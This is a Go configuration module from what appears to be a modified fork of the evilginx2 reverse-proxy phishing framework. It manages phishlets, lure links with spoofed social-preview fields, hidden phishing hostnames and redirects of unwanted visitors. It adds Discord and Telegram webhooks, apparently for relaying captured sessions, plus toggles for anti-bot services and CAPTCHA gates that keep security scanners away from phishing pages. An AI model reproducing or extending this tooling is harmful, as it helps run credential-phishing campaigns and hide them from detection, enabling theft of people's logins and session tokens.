package core

import (
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"strings"

	"github.com/kgretzky/evilginx2/log"

	"github.com/spf13/viper"
)

type Lure struct {
	Hostname        string `mapstructure:"hostname" yaml:"hostname"`
	Path            string `mapstructure:"path" yaml:"path"`
	RedirectUrl     string `mapstructure:"redirect_url" yaml:"redirect_url"`
	Phishlet        string `mapstructure:"phishlet" yaml:"phishlet"`
	Template        string `mapstructure:"template" yaml:"template"`
	UserAgentFilter string `mapstructure:"ua_filter" yaml:"ua_filter"`
	Info            string `mapstructure:"info" yaml:"info"`
	OgTitle         string `mapstructure:"og_title" yaml:"og_title"`
	OgDescription   string `mapstructure:"og_desc" yaml:"og_desc"`
	OgImageUrl      string `mapstructure:"og_image" yaml:"og_image"`
	OgUrl           string `mapstructure:"og_url" yaml:"og_url"`
}

type Config struct {
	siteDomains       map[string]string
	baseDomain        string
	serverIP          string
	proxyType         string
	proxyAddress      string
	proxyPort         int
	proxyUsername     string
	proxyPassword     string
	proxySession      bool
	blackListMode     string
	proxyEnabled      bool
	sitesEnabled      map[string]bool
	sitesHidden       map[string]bool
	phishlets         map[string]*Phishlet
	phishletNames     []string
	activeHostnames   []string
	redirectParam     string
	verificationParam string
	verificationToken string
	redirectUrl       string
	templatesDir      string
	lures             []*Lure
	cfg               *viper.Viper
	webhook_discord   string
	webhook_telegram  string
	webhook_verbosity int
	simplebotEnabled  bool
	nkpbotEnabled     bool
	killbotEnabled    bool
	killbot_apikey    string
	antibotpwEnabled  bool
	antibotpw_apikey  string
	adminpage_path    string
	turnstile_sitekey string
	turnstile_privkey string
	recaptcha_sitekey string
	recaptcha_privkey string
}

const (
	CFG_SITE_DOMAINS       = "site_domains"
	CFG_BASE_DOMAIN        = "server"
	CFG_SERVER_IP          = "ip"
	CFG_SITES_ENABLED      = "sites_enabled"
	CFG_SITES_HIDDEN       = "sites_hidden"
	CFG_REDIRECT_PARAM     = "redirect_key"
	CFG_VERIFICATION_PARAM = "verification_key"
	CFG_VERIFICATION_TOKEN = "verification_token"
	CFG_REDIRECT_URL       = "redirect_url"
	CFG_LURES              = "lures"
	CFG_PROXY_TYPE         = "proxy_type"
	CFG_PROXY_ADDRESS      = "proxy_address"
	CFG_PROXY_PORT         = "proxy_port"
	CFG_PROXY_USERNAME     = "proxy_username"
	CFG_PROXY_PASSWORD     = "proxy_password"
	CFG_PROXY_ENABLED      = "proxy_enabled"
	CFG_PROXY_SESSION      = "proxy_session"
	CFG_BLACKLIST_MODE     = "blacklist_mode"
	CFG_WEBHOOK_VERBOSITY  = "webhook_verbosity"
	CFG_WEBHOOK_TELEGRAM   = "webhook_telegram"
	CFG_WEBHOOK_DISCORD    = "webhook_discord"
	CFG_SIMPLEBOT_ENABLED  = "simplebot_enabled"
	CFG_NKPBOT_ENABLED     = "nkpbot_enabled"
	CFG_KILLBOT_ENABLED    = "killbot_enabled"
	CFG_KILLBOT_APIKEY     = "killbot_apikey"
	CFG_ANTIBOTPW_ENABLED  = "antibotpw_enabled"
	CFG_ANTIBOTPW_APIKEY   = "antibotpw_apikey"
	CFG_ADMINPAGE_PATH     = "adminpage_path"
	CFG_TURNSTILE_SITEKEY  = "turnstile_sitekey"
	CFG_TURNSTILE_PRIVKEY  = "turnstile_privkey"
	CFG_RECAPTCHA_SITEKEY  = "recaptcha_sitekey"
	CFG_RECAPTCHA_PRIVKEY  = "recaptcha_privkey"
)

const DEFAULT_REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll

func NewConfig(cfg_dir, path string) (*Config, error) {
	c := &Config{
		siteDomains:   make(map[string]string),
		sitesEnabled:  make(map[string]bool),
		sitesHidden:   make(map[string]bool),
		phishlets:     make(map[string]*Phishlet),
		phishletNames: []string{},
		lures:         []*Lure{},
	}

	c.cfg = viper.New()
	c.cfg.SetConfigType("yaml")

	if path == "" {
		path = filepath.Join(cfg_dir, "config.yaml")
	}
	err := os.MkdirAll(filepath.Dir(path), os.FileMode(0o700))
	if err != nil {
		return nil, err
	}
	var created_cfg bool = false
	c.cfg.SetConfigFile(path)
	if _, err := os.Stat(path); os.IsNotExist(err) {
		created_cfg = true
		err = c.cfg.WriteConfigAs(path)
		if err != nil {
			return nil, err
		}
	}

	err = c.cfg.ReadInConfig()
	if err != nil {
		return nil, err
	}

	c.baseDomain = c.cfg.GetString(CFG_BASE_DOMAIN)
	c.serverIP = c.cfg.GetString(CFG_SERVER_IP)
	c.siteDomains = c.cfg.GetStringMapString(CFG_SITE_DOMAINS)
	c.redirectParam = c.cfg.GetString(CFG_REDIRECT_PARAM)
	c.verificationParam = c.cfg.GetString(CFG_VERIFICATION_PARAM)
	c.verificationToken = c.cfg.GetString(CFG_VERIFICATION_TOKEN)
	c.redirectUrl = c.cfg.GetString(CFG_REDIRECT_URL)
	c.proxyType = c.cfg.GetString(CFG_PROXY_TYPE)
	c.proxyAddress = c.cfg.GetString(CFG_PROXY_ADDRESS)
	c.proxyPort = c.cfg.GetInt(CFG_PROXY_PORT)
	c.proxyUsername = c.cfg.GetString(CFG_PROXY_USERNAME)
	c.proxyPassword = c.cfg.GetString(CFG_PROXY_PASSWORD)
	c.proxyEnabled = c.cfg.GetBool(CFG_PROXY_ENABLED)
	c.proxySession = c.cfg.GetBool(CFG_PROXY_SESSION)
	c.blackListMode = c.cfg.GetString(CFG_BLACKLIST_MODE)
	c.webhook_verbosity = c.cfg.GetInt(CFG_WEBHOOK_VERBOSITY)
	c.webhook_discord = c.cfg.GetString(CFG_WEBHOOK_DISCORD)
	c.webhook_telegram = c.cfg.GetString(CFG_WEBHOOK_TELEGRAM)
	//
	c.simplebotEnabled = c.cfg.GetBool(CFG_SIMPLEBOT_ENABLED)
	c.nkpbotEnabled = c.cfg.GetBool(CFG_NKPBOT_ENABLED)
	c.killbotEnabled = c.cfg.GetBool(CFG_KILLBOT_ENABLED)
	c.killbot_apikey = c.cfg.GetString(CFG_KILLBOT_APIKEY)
	c.antibotpwEnabled = c.cfg.GetBool(CFG_ANTIBOTPW_ENABLED)
	c.antibotpw_apikey = c.cfg.GetString(CFG_ANTIBOTPW_APIKEY)
	//
	c.adminpage_path = c.cfg.GetString(CFG_ADMINPAGE_PATH)
	c.turnstile_sitekey = c.cfg.GetString(CFG_TURNSTILE_SITEKEY)
	c.turnstile_privkey = c.cfg.GetString(CFG_TURNSTILE_PRIVKEY)
	c.recaptcha_sitekey = c.cfg.GetString(CFG_RECAPTCHA_SITEKEY)
	c.recaptcha_privkey = c.cfg.GetString(CFG_RECAPTCHA_PRIVKEY)

	s_enabled := c.cfg.GetStringSlice(CFG_SITES_ENABLED)
	for _, site := range s_enabled {
		c.sitesEnabled[site] = true
	}
	s_hidden := c.cfg.GetStringSlice(CFG_SITES_HIDDEN)
	for _, site := range s_hidden {
		c.sitesHidden[site] = true
	}

	if !stringExists(c.blackListMode, []string{"all", "unauth", "off"}) {
		c.SetBlacklistMode("off")
	}

	var param string
	if c.redirectParam == "" {
		param = strings.ToLower(GenRandomString(2))
		c.SetRedirectParam(param)
	}
	if c.verificationParam == "" {
		for {
			param = strings.ToLower(GenRandomString(2))
			if param != c.redirectParam {
				break
			}
		}
		c.SetVerificationParam(param)
	}
	if c.verificationToken == "" {
		c.SetVerificationToken(GenRandomToken()[:4])
	}
	if c.redirectUrl == "" && created_cfg {
		c.SetRedirectUrl(DEFAULT_REDIRECT_URL)
	}
	c.lures = []*Lure{}
	err = c.cfg.UnmarshalKey(CFG_LURES, &c.lures)
	if err != nil {
		return nil, err
	}

	if c.adminpage_path == "" {
		c.SetAdminpagePath(fmt.Sprintf("%v", rand.Intn(9999)))
	}

	return c, nil
}

func (c *Config) SetSiteHostname(site, domain string) bool {
	if c.baseDomain == "" {
		log.Error("you need to set server domain, first. type: server your-domain.com")
		return false
	}
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return false
	}
	if domain != c.baseDomain && !strings.HasSuffix(domain, "."+c.baseDomain) {
		log.Error("phishlet hostname must end with '%s'", c.baseDomain)
		return false
	}
	c.siteDomains[site] = domain
	c.cfg.Set(CFG_SITE_DOMAINS, c.siteDomains)
	log.Info("phishlet '%s' hostname set to: %s", site, domain)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
	return true
}

func (c *Config) SetBaseDomain(domain string) {
	c.baseDomain = domain
	c.cfg.Set(CFG_BASE_DOMAIN, c.baseDomain)
	log.Info("server domain set to: %s", domain)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetServerIP(ip_addr string) {
	c.serverIP = ip_addr
	c.cfg.Set(CFG_SERVER_IP, c.serverIP)
	log.Info("server IP set to: %s", ip_addr)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) EnableProxy(enabled bool) {
	c.proxyEnabled = enabled
	c.cfg.Set(CFG_PROXY_ENABLED, c.proxyEnabled)
	if enabled {
		log.Info("enabled proxy")
	} else {
		log.Info("disabled proxy")
	}
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) EnableSessionProxy(enabled bool) {
	c.proxySession = enabled
	c.cfg.Set(CFG_PROXY_SESSION, c.proxySession)
	if enabled {
		log.Info("enabled session proxy")
	} else {
		log.Info("disabled session proxy")
	}
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) GetSessionProxy() bool {
	return c.proxySession
}

func (c *Config) SetProxyType(ptype string) {
	ptypes := []string{"http", "https", "socks5", "socks5h"}
	if !stringExists(ptype, ptypes) {
		log.Error("invalid proxy type selected")
		return
	}
	c.proxyType = ptype
	c.cfg.Set(CFG_PROXY_TYPE, c.proxyType)
	log.Info("proxy type set to: %s", c.proxyType)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetProxyAddress(address string) {
	c.proxyAddress = address
	c.cfg.Set(CFG_PROXY_ADDRESS, c.proxyAddress)
	log.Info("proxy address set to: %s", c.proxyAddress)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetProxyPort(port int) {
	c.proxyPort = port
	c.cfg.Set(CFG_PROXY_PORT, c.proxyPort)
	log.Info("proxy port set to: %d", c.proxyPort)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetProxyUsername(username string) {
	c.proxyUsername = username
	c.cfg.Set(CFG_PROXY_USERNAME, c.proxyUsername)
	log.Info("proxy username set to: %s", c.proxyUsername)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetProxyPassword(password string) {
	c.proxyPassword = password
	c.cfg.Set(CFG_PROXY_PASSWORD, c.proxyPassword)
	log.Info("proxy password set to: %s", c.proxyPassword)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) IsLureHostnameValid(hostname string) bool {
	for _, l := range c.lures {
		if l.Hostname == hostname {
			if c.sitesEnabled[l.Phishlet] {
				return true
			}
		}
	}
	return false
}

func (c *Config) SetSiteEnabled(site string) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	if !c.IsSiteEnabled(site) {
		c.sitesEnabled[site] = true
	}
	c.refreshActiveHostnames()
	var sites []string
	for s := range c.sitesEnabled {
		sites = append(sites, s)
	}
	c.cfg.Set(CFG_SITES_ENABLED, sites)
	log.Info("enabled phishlet '%s'", site)
	err := c.cfg.WriteConfig()
	if err != nil {
		return err
	}
	return nil
}

func (c *Config) SetSiteDisabled(site string) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	if c.IsSiteEnabled(site) {
		delete(c.sitesEnabled, site)
	}
	c.refreshActiveHostnames()
	var sites []string
	for s := range c.sitesEnabled {
		sites = append(sites, s)
	}
	c.cfg.Set(CFG_SITES_ENABLED, sites)
	log.Info("disabled phishlet '%s'", site)
	err := c.cfg.WriteConfig()
	if err != nil {
		return err
	}
	return nil
}

func (c *Config) SetSiteHidden(site string, hide bool) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	if hide {
		if !c.IsSiteHidden(site) {
			c.sitesHidden[site] = true
		}
	} else {
		if c.IsSiteHidden(site) {
			delete(c.sitesHidden, site)
		}
	}
	c.refreshActiveHostnames()
	var sites []string
	for s := range c.sitesHidden {
		sites = append(sites, s)
	}
	c.cfg.Set(CFG_SITES_HIDDEN, sites)
	if hide {
		log.Info("phishlet '%s' is now hidden and all requests to it will be redirected", site)
	} else {
		log.Info("phishlet '%s' is now reachable and visible from the outside", site)
	}
	err := c.cfg.WriteConfig()
	if err != nil {
		return err
	}
	return nil
}

func (c *Config) SetTemplatesDir(path string) {
	c.templatesDir = path
}

func (c *Config) ResetAllSites() {
	for s := range c.sitesEnabled {
		err := c.SetSiteDisabled(s)
		if err != nil {
			log.Error("disabling: %s resulted in error: %s", s, err)
		}
	}
	for s := range c.phishlets {
		c.siteDomains[s] = ""
	}
	c.cfg.Set(CFG_SITE_DOMAINS, c.siteDomains)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) IsSiteEnabled(site string) bool {
	s, ok := c.sitesEnabled[site]
	if !ok {
		return false
	}
	return s
}

func (c *Config) IsSiteHidden(site string) bool {
	s, ok := c.sitesHidden[site]
	if !ok {
		return false
	}
	return s
}

func (c *Config) GetEnabledSites() []string {
	var sites []string
	for s := range c.sitesEnabled {
		sites = append(sites, s)
	}
	return sites
}

func (c *Config) SetRedirectParam(param string) {
	c.redirectParam = param
	c.cfg.Set(CFG_REDIRECT_PARAM, param)
	log.Info("redirect parameter set to: %s", param)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetBlacklistMode(mode string) {
	if stringExists(mode, []string{"all", "unauth", "off"}) {
		c.blackListMode = mode
		c.cfg.Set(CFG_BLACKLIST_MODE, mode)
		err := c.cfg.WriteConfig()
		if err != nil {
			log.Error("write config: %v", err)
		}
	}
	log.Info("blacklist mode set to: %s", mode)
}

func (c *Config) SetVerificationParam(param string) {
	c.verificationParam = param
	c.cfg.Set(CFG_VERIFICATION_PARAM, param)
	log.Info("verification parameter set to: %s", param)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetVerificationToken(token string) {
	c.verificationToken = token
	c.cfg.Set(CFG_VERIFICATION_TOKEN, token)
	log.Info("verification token set to: %s", token)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetWebhookVerbosity(verbosity int) {
	c.webhook_verbosity = verbosity
	c.cfg.Set(CFG_WEBHOOK_VERBOSITY, verbosity)
	log.Info("webhook verbosity set to: %s", fmt.Sprint(verbosity))
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetWebhookDiscord(webhook string) {
	c.webhook_discord = webhook
	c.cfg.Set(CFG_WEBHOOK_DISCORD, webhook)
	log.Info("discord webhook set to: %s", webhook)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetWebhookTelegram(webhook string) {
	c.webhook_telegram = webhook
	c.cfg.Set(CFG_WEBHOOK_TELEGRAM, webhook)
	log.Info("telegram webhook set to: %s", webhook)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetTurnstileSitekey(key string) {
	c.turnstile_sitekey = key
	c.cfg.Set(CFG_TURNSTILE_SITEKEY, key)
	log.Info("Turnstile site key set to: %s", key)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetTurnstilePrivkey(key string) {
	c.turnstile_privkey = key
	c.cfg.Set(CFG_TURNSTILE_PRIVKEY, key)
	log.Info("Turnstile private key set to: %s", key)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetReCaptchaSitekey(key string) {
	c.recaptcha_sitekey = key
	c.cfg.Set(CFG_RECAPTCHA_SITEKEY, key)
	log.Info("reCAPTCHA site key set to: %s", key)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetReCaptchaPrivkey(key string) {
	c.recaptcha_privkey = key
	c.cfg.Set(CFG_RECAPTCHA_PRIVKEY, key)
	log.Info("reCAPTCHA private key set to: %s", key)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) ToggleSimpleBot() {
	enable := true
	if c.simplebotEnabled {
		enable = false
	}
	c.simplebotEnabled = enable
	c.cfg.Set(CFG_SIMPLEBOT_ENABLED, enable)
	if enable {
		log.Info("enabled simplebot aversion")
	} else {
		log.Info("disabled simplebot aversion")
	}
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) ToggleNkpBot() {
	enable := true
	if c.nkpbotEnabled {
		enable = false
	}
	c.nkpbotEnabled = enable
	c.cfg.Set(CFG_NKPBOT_ENABLED, enable)
	if enable {
		log.Info("enabled nkpbot aversion")
	} else {
		log.Info("disabled nkpbot aversion")
	}
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) ToggleAntibotPw() {
	enable := true
	if c.antibotpwEnabled {
		enable = false
	}
	if enable {
		if key_length := len(c.antibotpw_apikey); key_length != 32 {
			log.Error("error: antibotpw api key should be 32 characters but is %v", key_length)
			log.Info("disabled antibot.pw aversion")
			c.antibotpwEnabled = enable
			c.cfg.Set(CFG_ANTIBOTPW_ENABLED, c.antibotpwEnabled)
			err := c.cfg.WriteConfig()
			if err != nil {
				log.Error("write config: %v", err)
			}
			return
		}
		log.Info("enabled antibot.pw aversion")
	} else {
		log.Info("disabled antibot.pw aversion")
	}
	c.antibotpwEnabled = enable
	c.cfg.Set(CFG_ANTIBOTPW_ENABLED, c.antibotpwEnabled)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetAntiBotPwApikey(key string) {
	c.antibotpw_apikey = key
	c.cfg.Set(CFG_ANTIBOTPW_APIKEY, key)
	log.Info("antibotpw key set to: %s", key)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) GetAntiBotPwApikey() string {
	return c.antibotpw_apikey
}

func (c *Config) ToggleKillbot() {
	enable := true
	if c.killbotEnabled {
		enable = false
	}
	c.killbotEnabled = enable
	if enable {
		if key_length := len(c.killbot_apikey); key_length != 45 {
			log.Error("killbot api key should be 45 characters but is %v", key_length)
			log.Info("disabled killbot")
			c.cfg.Set(CFG_KILLBOT_ENABLED, c.killbotEnabled)
			err := c.cfg.WriteConfig()
			if err != nil {
				log.Error("write config: %v", err)
			}
			return
		}
		log.Info("enabled killbot")
	} else {
		log.Info("disabled killbot")
	}
	c.cfg.Set(CFG_KILLBOT_ENABLED, c.killbotEnabled)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetKillBotApikey(key string) {
	c.killbot_apikey = key
	c.cfg.Set(CFG_KILLBOT_APIKEY, key)
	log.Info("killbot key set to: %s", key)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) GetKillBotApikey() string {
	return c.killbot_apikey
}

func (c *Config) SetRedirectUrl(url string) {
	c.redirectUrl = url
	c.cfg.Set(CFG_REDIRECT_URL, url)
	log.Info("unauthorized request redirection URL set to: %s", url)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetAdminpagePath(path string) {
	c.adminpage_path = path
	c.cfg.Set(CFG_ADMINPAGE_PATH, path)
	log.Info("adminpage authorization path set to: %s", path)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) refreshActiveHostnames() {
	c.activeHostnames = []string{}
	sites := c.GetEnabledSites()
	for _, site := range sites {
		pl, err := c.GetPhishlet(site)
		if err != nil {
			continue
		}
		c.activeHostnames = append(c.activeHostnames, pl.GetPhishHosts()...)
	}
	for _, l := range c.lures {
		if stringExists(l.Phishlet, sites) {
			if l.Hostname != "" {
				c.activeHostnames = append(c.activeHostnames, l.Hostname)
			}
		}
	}
}

func (c *Config) IsActiveHostname(host string) bool {
	if host[len(host)-1:] == "." {
		host = host[:len(host)-1]
	}
	for _, h := range c.activeHostnames {
		if h == host {
			return true
		}
	}
	return false
}

func (c *Config) AddPhishlet(site string, pl *Phishlet) {
	c.phishletNames = append(c.phishletNames, site)
	c.phishlets[site] = pl
}

func (c *Config) AddLure(site string, l *Lure) {
	c.lures = append(c.lures, l)
	c.cfg.Set(CFG_LURES, c.lures)
	err := c.cfg.WriteConfig()
	if err != nil {
		log.Error("write config: %v", err)
	}
}

func (c *Config) SetLure(index int, l *Lure) error {
	if index >= 0 && index < len(c.lures) {
		c.lures[index] = l
	} else {
		return fmt.Errorf("index out of bounds: %d", index)
	}
	c.cfg.Set(CFG_LURES, c.lures)
	err := c.cfg.WriteConfig()
	if err != nil {
		return err
	}
	return nil
}

func (c *Config) DeleteLure(index int) error {
	if index >= 0 && index < len(c.lures) {
		c.lures = append(c.lures[:index], c.lures[index+1:]...)
	} else {
		return fmt.Errorf("index out of bounds: %d", index)
	}
	c.cfg.Set(CFG_LURES, c.lures)
	err := c.cfg.WriteConfig()
	if err != nil {
		return err
	}
	return nil
}

func (c *Config) DeleteLures(index []int) []int {
	tlures := []*Lure{}
	di := []int{}
	for n, l := range c.lures {
		if !intExists(n, index) {
			tlures = append(tlures, l)
		} else {
			di = append(di, n)
		}
	}
	if len(di) > 0 {
		c.lures = tlures
		c.cfg.Set(CFG_LURES, c.lures)
		err := c.cfg.WriteConfig()
		if err != nil {
			log.Error("write config: %v", err)
		}
	}
	return di
}

func (c *Config) GetLure(index int) (*Lure, error) {
	if index >= 0 && index < len(c.lures) {
		return c.lures[index], nil
	} else {
		return nil, fmt.Errorf("index out of bounds: %d", index)
	}
}

func (c *Config) GetLureByPath(site, path string) (*Lure, error) {
	for _, l := range c.lures {
		if l.Phishlet == site {
			if l.Path == path {
				return l, nil
			}
		}
	}
	return nil, fmt.Errorf("lure for path '%s' not found", path)
}

func (c *Config) GetPhishlet(site string) (*Phishlet, error) {
	pl, ok := c.phishlets[site]
	if !ok {
		return nil, fmt.Errorf("phishlet '%s' not found", site)
	}
	return pl, nil
}

func (c *Config) GetPhishletNames() []string {
	return c.phishletNames
}

func (c *Config) GetSiteDomain(site string) (string, bool) {
	domain, ok := c.siteDomains[site]
	return domain, ok
}

func (c *Config) GetAllDomains() []string {
	var ret []string
	for _, dom := range c.siteDomains {
		ret = append(ret, dom)
	}
	return ret
}

func (c *Config) GetBaseDomain() string {
	return c.baseDomain
}

func (c *Config) GetServerIP() string {
	return c.serverIP
}

func (c *Config) GetTemplatesDir() string {
	return c.templatesDir
}

func (c *Config) GetBlacklistMode() string {
	return c.blackListMode
}
